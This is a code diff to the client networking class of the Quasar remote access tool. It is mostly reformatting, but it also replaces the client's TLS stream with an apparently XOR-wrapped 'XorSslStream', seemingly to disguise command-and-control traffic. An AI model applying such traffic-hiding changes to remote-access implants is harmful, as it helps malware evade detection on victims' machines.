@@ -1,6 +1,7 @@
 ﻿using Quasar.Client.ReverseProxy;
 using Quasar.Common.Extensions;
 using Quasar.Common.Messages;
+using Quasar.Common.Streams;
 using Quasar.Common.Messages.ReverseProxy;
 using Quasar.Common.Networking;
 using System;
@@ -126,27 +127,32 @@ namespace Quasar.Client.Networking
         /// <summary>
         /// The buffer size for receiving data in bytes.
         /// </summary>
-        public int BUFFER_SIZE { get { return 1024 * 16; } } // 16KB
+        public int BUFFER_SIZE
+        { get { return 1024 * 16; } } // 16KB
 
         /// <summary>
         /// The keep-alive time in ms.
         /// </summary>
-        public uint KEEP_ALIVE_TIME { get { return 25000; } } // 25s
+        public uint KEEP_ALIVE_TIME
+        { get { return 25000; } } // 25s
 
         /// <summary>
         /// The keep-alive interval in ms.
         /// </summary>
-        public uint KEEP_ALIVE_INTERVAL { get { return 25000; } } // 25s
+        public uint KEEP_ALIVE_INTERVAL
+        { get { return 25000; } } // 25s
 
         /// <summary>
         /// The header size in bytes.
         /// </summary>
-        public int HEADER_SIZE { get { return 4; } } // 4B
+        public int HEADER_SIZE
+        { get { return 4; } } // 4B
 
         /// <summary>
         /// The maximum size of a message in bytes.
         /// </summary>
-        public int MAX_MESSAGE_SIZE { get { return (1024 * 1024) * 5; } } // 5MB
+        public int MAX_MESSAGE_SIZE
+        { get { return (1024 * 1024) * 5; } } // 5MB
 
         /// <summary>
         /// Returns an array containing all of the proxy clients of this client.
@@ -170,7 +176,7 @@ namespace Quasar.Client.Networking
         /// <summary>
         /// The stream used for communication.
         /// </summary>
-        private SslStream _stream;
+        private XorSslStream _stream;
 
         /// <summary>
         /// The server certificate.
@@ -234,6 +240,7 @@ namespace Quasar.Client.Networking
 
         // Receive info
         private int _readOffset;
+
         private int _writeOffset;
         private int _readableDataLen;
         private int _payloadLen;
@@ -273,7 +280,7 @@ namespace Quasar.Client.Networking
 
                 if (handle.Connected)
                 {
-                    _stream = new SslStream(new NetworkStream(handle, true), false, ValidateServerCertificate);
+                    _stream = new XorSslStream(new NetworkStream(handle, true), false, ValidateServerCertificate);
                     _stream.AuthenticateAsClient(ip.ToString(), null, SslProtocols.Tls12, false);
                     _stream.BeginRead(_readBuffer, 0, _readBuffer.Length, AsyncReceive, null);
                     OnClientState(true);
